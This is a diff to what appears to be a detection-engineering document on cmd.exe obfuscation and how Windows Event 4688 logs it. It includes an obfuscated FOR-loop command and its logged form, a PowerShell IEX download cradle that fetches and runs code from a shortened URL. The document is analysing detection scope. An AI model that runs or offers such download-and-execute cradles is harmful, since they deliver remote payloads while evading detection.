@@ -97,8 +97,8 @@ However in child Process Creation WEL Security Event ID 4688 existing environmen
 ```
 So this subtype of binary obfuscation is considered out of scope for this Issue.
 
-#### For Loop Value Extraction
-The same as Environment Variable Substrings in the last child Process Creation WEL Security Event ID 4688 existing environment variables resolve to their underlying value. E.g. if we'll use this example command:
+#### For Loop
+The same as with Environment Variable Substrings if you use For Loop then in the last child Process Creation WEL Security Event ID 4688 existing environment variables resolve to their underlying value. E.g. if we'll use this example command:
 ```CMD
 C:\>cmd /c "FOR /F "delims=6M. tokens=2" %Z IN ('ftype^|findstr lMo')DO %Z IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')"
 
@@ -117,7 +117,9 @@ we'll see the following parent-child process creation chain in WEL:
  <Data Name="ProcessId">0x990</Data> 
  <Data Name="CommandLine">PowerShell IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')</Data> 
 ```
+So this subtype of binary obfuscation is considered out of scope for this Issue.
 
+Therefor all binary obfuscation is considered out of scope for this Issue.
 
 ### ENCODING
 Substrings of existing environment variables can be used to encode entire batch file contents or select portions of commands. The payload encoding techniques in these samples only affect static detections because these encodings do not remain in the dynamic execution of external commands in the batch files, so they are considered out of scope for this Issue.
